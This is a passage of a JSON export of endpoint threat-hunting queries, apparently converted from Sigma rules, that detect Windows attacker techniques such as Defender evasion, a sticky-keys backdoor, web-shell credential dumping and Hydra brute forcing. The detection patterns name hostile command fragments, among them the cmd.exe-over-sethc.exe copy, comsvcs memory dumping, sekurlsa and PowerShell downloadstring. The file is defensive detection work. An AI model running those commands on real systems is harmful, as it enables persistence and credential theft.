            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the filename DumpStack.log to evade Microsoft Defender",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "DumpStack.log Defender Evasion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\DumpStack.log\" or tgt.process.cmdline contains \" -o DumpStack.log\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 520
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "PUA - DefenderCheck Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\DefenderCheck.exe\" or tgt.process.displayName=\"DefenderCheck\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 521
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1587"
            ],
            "name": "Potential Privilege Escalation To LOCAL SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -s cmd\" or tgt.process.cmdline contains \" /s cmd\" or tgt.process.cmdline contains \" \u2013s cmd\" or tgt.process.cmdline contains \" \u2014s cmd\" or tgt.process.cmdline contains \" \u2015s cmd\" or tgt.process.cmdline contains \" -s -i cmd\" or tgt.process.cmdline contains \" -s /i cmd\" or tgt.process.cmdline contains \" -s \u2013i cmd\" or tgt.process.cmdline contains \" -s \u2014i cmd\" or tgt.process.cmdline contains \" -s \u2015i cmd\" or tgt.process.cmdline contains \" /s -i cmd\" or tgt.process.cmdline contains \" /s /i cmd\" or tgt.process.cmdline contains \" /s \u2013i cmd\" or tgt.process.cmdline contains \" /s \u2014i cmd\" or tgt.process.cmdline contains \" /s \u2015i cmd\" or tgt.process.cmdline contains \" \u2013s -i cmd\" or tgt.process.cmdline contains \" \u2013s /i cmd\" or tgt.process.cmdline contains \" \u2013s \u2013i cmd\" or tgt.process.cmdline contains \" \u2013s \u2014i cmd\" or tgt.process.cmdline contains \" \u2013s \u2015i cmd\" or tgt.process.cmdline contains \" \u2014s -i cmd\" or tgt.process.cmdline contains \" \u2014s /i cmd\" or tgt.process.cmdline contains \" \u2014s \u2013i cmd\" or tgt.process.cmdline contains \" \u2014s \u2014i cmd\" or tgt.process.cmdline contains \" \u2014s \u2015i cmd\" or tgt.process.cmdline contains \" \u2015s -i cmd\" or tgt.process.cmdline contains \" \u2015s /i cmd\" or tgt.process.cmdline contains \" \u2015s \u2013i cmd\" or tgt.process.cmdline contains \" \u2015s \u2014i cmd\" or tgt.process.cmdline contains \" \u2015s \u2015i cmd\" or tgt.process.cmdline contains \" -i -s cmd\" or tgt.process.cmdline contains \" -i /s cmd\" or tgt.process.cmdline contains \" -i \u2013s cmd\" or tgt.process.cmdline contains \" -i \u2014s cmd\" or tgt.process.cmdline contains \" -i \u2015s cmd\" or tgt.process.cmdline contains \" /i -s cmd\" or tgt.process.cmdline contains \" /i /s cmd\" or tgt.process.cmdline contains \" /i \u2013s cmd\" or tgt.process.cmdline contains \" /i \u2014s cmd\" or tgt.process.cmdline contains \" /i \u2015s cmd\" or tgt.process.cmdline contains \" \u2013i -s cmd\" or tgt.process.cmdline contains \" \u2013i /s cmd\" or tgt.process.cmdline contains \" \u2013i \u2013s cmd\" or tgt.process.cmdline contains \" \u2013i \u2014s cmd\" or tgt.process.cmdline contains \" \u2013i \u2015s cmd\" or tgt.process.cmdline contains \" \u2014i -s cmd\" or tgt.process.cmdline contains \" \u2014i /s cmd\" or tgt.process.cmdline contains \" \u2014i \u2013s cmd\" or tgt.process.cmdline contains \" \u2014i \u2014s cmd\" or tgt.process.cmdline contains \" \u2014i \u2015s cmd\" or tgt.process.cmdline contains \" \u2015i -s cmd\" or tgt.process.cmdline contains \" \u2015i /s cmd\" or tgt.process.cmdline contains \" \u2015i \u2013s cmd\" or tgt.process.cmdline contains \" \u2015i \u2014s cmd\" or tgt.process.cmdline contains \" \u2015i \u2015s cmd\" or tgt.process.cmdline contains \" -s pwsh\" or tgt.process.cmdline contains \" /s pwsh\" or tgt.process.cmdline contains \" \u2013s pwsh\" or tgt.process.cmdline contains \" \u2014s pwsh\" or tgt.process.cmdline contains \" \u2015s pwsh\" or tgt.process.cmdline contains \" -s -i pwsh\" or tgt.process.cmdline contains \" -s /i pwsh\" or tgt.process.cmdline contains \" -s \u2013i pwsh\" or tgt.process.cmdline contains \" -s \u2014i pwsh\" or tgt.process.cmdline contains \" -s \u2015i pwsh\" or tgt.process.cmdline contains \" /s -i pwsh\" or tgt.process.cmdline contains \" /s /i pwsh\" or tgt.process.cmdline contains \" /s \u2013i pwsh\" or tgt.process.cmdline contains \" /s \u2014i pwsh\" or tgt.process.cmdline contains \" /s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2013s -i pwsh\" or tgt.process.cmdline contains \" \u2013s /i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2014s -i pwsh\" or tgt.process.cmdline contains \" \u2014s /i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2015s -i pwsh\" or tgt.process.cmdline contains \" \u2015s /i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2015s \u2015i pwsh\" or tgt.process.cmdline contains \" -i -s pwsh\" or tgt.process.cmdline contains \" -i /s pwsh\" or tgt.process.cmdline contains \" -i \u2013s pwsh\" or tgt.process.cmdline contains \" -i \u2014s pwsh\" or tgt.process.cmdline contains \" -i \u2015s pwsh\" or tgt.process.cmdline contains \" /i -s pwsh\" or tgt.process.cmdline contains \" /i /s pwsh\" or tgt.process.cmdline contains \" /i \u2013s pwsh\" or tgt.process.cmdline contains \" /i \u2014s pwsh\" or tgt.process.cmdline contains \" /i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2013i -s pwsh\" or tgt.process.cmdline contains \" \u2013i /s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2013i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2014i -s pwsh\" or tgt.process.cmdline contains \" \u2014i /s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2014i \u2015s pwsh\" or tgt.process.cmdline contains \" \u2015i -s pwsh\" or tgt.process.cmdline contains \" \u2015i /s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2013s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2014s pwsh\" or tgt.process.cmdline contains \" \u2015i \u2015s pwsh\" or tgt.process.cmdline contains \" -s powershell\" or tgt.process.cmdline contains \" /s powershell\" or tgt.process.cmdline contains \" \u2013s powershell\" or tgt.process.cmdline contains \" \u2014s powershell\" or tgt.process.cmdline contains \" \u2015s powershell\" or tgt.process.cmdline contains \" -s -i powershell\" or tgt.process.cmdline contains \" -s /i powershell\" or tgt.process.cmdline contains \" -s \u2013i powershell\" or tgt.process.cmdline contains \" -s \u2014i powershell\" or tgt.process.cmdline contains \" -s \u2015i powershell\" or tgt.process.cmdline contains \" /s -i powershell\" or tgt.process.cmdline contains \" /s /i powershell\" or tgt.process.cmdline contains \" /s \u2013i powershell\" or tgt.process.cmdline contains \" /s \u2014i powershell\" or tgt.process.cmdline contains \" /s \u2015i powershell\" or tgt.process.cmdline contains \" \u2013s -i powershell\" or tgt.process.cmdline contains \" \u2013s /i powershell\" or tgt.process.cmdline contains \" \u2013s \u2013i powershell\" or tgt.process.cmdline contains \" \u2013s \u2014i powershell\" or tgt.process.cmdline contains \" \u2013s \u2015i powershell\" or tgt.process.cmdline contains \" \u2014s -i powershell\" or tgt.process.cmdline contains \" \u2014s /i powershell\" or tgt.process.cmdline contains \" \u2014s \u2013i powershell\" or tgt.process.cmdline contains \" \u2014s \u2014i powershell\" or tgt.process.cmdline contains \" \u2014s \u2015i powershell\" or tgt.process.cmdline contains \" \u2015s -i powershell\" or tgt.process.cmdline contains \" \u2015s /i powershell\" or tgt.process.cmdline contains \" \u2015s \u2013i powershell\" or tgt.process.cmdline contains \" \u2015s \u2014i powershell\" or tgt.process.cmdline contains \" \u2015s \u2015i powershell\" or tgt.process.cmdline contains \" -i -s powershell\" or tgt.process.cmdline contains \" -i /s powershell\" or tgt.process.cmdline contains \" -i \u2013s powershell\" or tgt.process.cmdline contains \" -i \u2014s powershell\" or tgt.process.cmdline contains \" -i \u2015s powershell\" or tgt.process.cmdline contains \" /i -s powershell\" or tgt.process.cmdline contains \" /i /s powershell\" or tgt.process.cmdline contains \" /i \u2013s powershell\" or tgt.process.cmdline contains \" /i \u2014s powershell\" or tgt.process.cmdline contains \" /i \u2015s powershell\" or tgt.process.cmdline contains \" \u2013i -s powershell\" or tgt.process.cmdline contains \" \u2013i /s powershell\" or tgt.process.cmdline contains \" \u2013i \u2013s powershell\" or tgt.process.cmdline contains \" \u2013i \u2014s powershell\" or tgt.process.cmdline contains \" \u2013i \u2015s powershell\" or tgt.process.cmdline contains \" \u2014i -s powershell\" or tgt.process.cmdline contains \" \u2014i /s powershell\" or tgt.process.cmdline contains \" \u2014i \u2013s powershell\" or tgt.process.cmdline contains \" \u2014i \u2014s powershell\" or tgt.process.cmdline contains \" \u2014i \u2015s powershell\" or tgt.process.cmdline contains \" \u2015i -s powershell\" or tgt.process.cmdline contains \" \u2015i /s powershell\" or tgt.process.cmdline contains \" \u2015i \u2013s powershell\" or tgt.process.cmdline contains \" \u2015i \u2014s powershell\" or tgt.process.cmdline contains \" \u2015i \u2015s powershell\") and (not (tgt.process.cmdline contains \"paexec\" or tgt.process.cmdline contains \"PsExec\" or tgt.process.cmdline contains \"accepteula\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 522
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system.\nWhen the sticky keys are \"activated\" the privilleged shell is launched.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "Persistence Via Sticky Key Backdoor",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"copy \" and tgt.process.cmdline contains \"/y \" and tgt.process.cmdline contains \"C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 523
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects certain parent child patterns found in cases in which a web shell is used to perform certain credential dumping or exfiltration activities on a compromised system\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505",
                "t1018",
                "t1033",
                "t1087"
            ],
            "name": "Webshell Hacking Activity Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\caddy.exe\" or src.process.image.path contains \"\\httpd.exe\" or src.process.image.path contains \"\\nginx.exe\" or src.process.image.path contains \"\\php-cgi.exe\" or src.process.image.path contains \"\\w3wp.exe\" or src.process.image.path contains \"\\ws_tomcatservice.exe\") or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (src.process.image.path contains \"-tomcat-\" or src.process.image.path contains \"\\tomcat\")) or ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and (tgt.process.cmdline contains \"catalina.jar\" or tgt.process.cmdline contains \"CATALINA_HOME\"))) and ((tgt.process.cmdline contains \"rundll32\" and tgt.process.cmdline contains \"comsvcs\") or (tgt.process.cmdline contains \" -hp\" and tgt.process.cmdline contains \" a \" and tgt.process.cmdline contains \" -m\") or (tgt.process.cmdline contains \"net\" and tgt.process.cmdline contains \" user \" and tgt.process.cmdline contains \" /add\") or (tgt.process.cmdline contains \"net\" and tgt.process.cmdline contains \" localgroup \" and tgt.process.cmdline contains \" administrators \" and tgt.process.cmdline contains \"/add\") or (tgt.process.image.path contains \"\\ntdsutil.exe\" or tgt.process.image.path contains \"\\ldifde.exe\" or tgt.process.image.path contains \"\\adfind.exe\" or tgt.process.image.path contains \"\\procdump.exe\" or tgt.process.image.path contains \"\\Nanodump.exe\" or tgt.process.image.path contains \"\\vssadmin.exe\" or tgt.process.image.path contains \"\\fsutil.exe\") or (tgt.process.cmdline contains \" -decode \" or tgt.process.cmdline contains \" -NoP \" or tgt.process.cmdline contains \" -W Hidden \" or tgt.process.cmdline contains \" /decode \" or tgt.process.cmdline contains \" /ticket:\" or tgt.process.cmdline contains \" sekurlsa\" or tgt.process.cmdline contains \".dmp full\" or tgt.process.cmdline contains \".downloadfile(\" or tgt.process.cmdline contains \".downloadstring(\" or tgt.process.cmdline contains \"FromBase64String\" or tgt.process.cmdline contains \"process call create\" or tgt.process.cmdline contains \"reg save \" or tgt.process.cmdline contains \"whoami /priv\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 524
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,\nUsee to Query/modify DNS records for Active Directory integrated DNS via LDAP\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1018"
            ],
            "name": "PUA - Adidnsdump Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\python.exe\" and tgt.process.cmdline contains \"adidnsdump\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 525
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a regedit started with TrustedInstaller privileges or by ProcessHacker.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Regedit as Trusted Installer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\regedit.exe\" and (src.process.image.path contains \"\\TrustedInstaller.exe\" or src.process.image.path contains \"\\ProcessHacker.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 526
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of \"aspnet_compiler.exe\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Suspicious Child Process of AspNetCompiler",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\aspnet_compiler.exe\" and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\notepad.exe\") or (tgt.process.image.path contains \"\\Users\\Public\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Roaming\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \":\\Windows\\System32\\Tasks\\\" or tgt.process.image.path contains \":\\Windows\\Tasks\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 527
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe.\nThis could be a sign of obfuscation of a fat finger problem (typo by the developer).\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Cmd.EXE Missing Space Characters Execution Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"cmd.exe/c\" or tgt.process.cmdline contains \"\\cmd/c\" or tgt.process.cmdline contains \"\\\"cmd/c\" or tgt.process.cmdline contains \"cmd.exe/k\" or tgt.process.cmdline contains \"\\cmd/k\" or tgt.process.cmdline contains \"\\\"cmd/k\" or tgt.process.cmdline contains \"cmd.exe/r\" or tgt.process.cmdline contains \"\\cmd/r\" or tgt.process.cmdline contains \"\\\"cmd/r\") or (tgt.process.cmdline contains \"/cwhoami\" or tgt.process.cmdline contains \"/cpowershell\" or tgt.process.cmdline contains \"/cschtasks\" or tgt.process.cmdline contains \"/cbitsadmin\" or tgt.process.cmdline contains \"/ccertutil\" or tgt.process.cmdline contains \"/kwhoami\" or tgt.process.cmdline contains \"/kpowershell\" or tgt.process.cmdline contains \"/kschtasks\" or tgt.process.cmdline contains \"/kbitsadmin\" or tgt.process.cmdline contains \"/kcertutil\") or (tgt.process.cmdline contains \"cmd.exe /c\" or tgt.process.cmdline contains \"cmd /c\" or tgt.process.cmdline contains \"cmd.exe /k\" or tgt.process.cmdline contains \"cmd /k\" or tgt.process.cmdline contains \"cmd.exe /r\" or tgt.process.cmdline contains \"cmd /r\")) and (not ((tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd /c \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd /k \" or tgt.process.cmdline contains \"cmd.exe /r \" or tgt.process.cmdline contains \"cmd /r \") or (tgt.process.cmdline contains \"AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules\" or tgt.process.cmdline contains \"cmd.exe/c .\" or tgt.process.cmdline=\"cmd.exe /c\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 528
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects modification addition to the 'TypedPaths' key in the user or admin registry via the commandline. Which might indicate persistence attempt",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Persistence Via TypedPaths - CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 529
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line parameters used by Hydra password guessing hack tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1110",
                "t1110"
            ],
            "name": "HackTool - Hydra Password Bruteforce Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"-u \" and tgt.process.cmdline contains \"-p \") and (tgt.process.cmdline contains \"^USER^\" or tgt.process.cmdline contains \"^PASS^\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
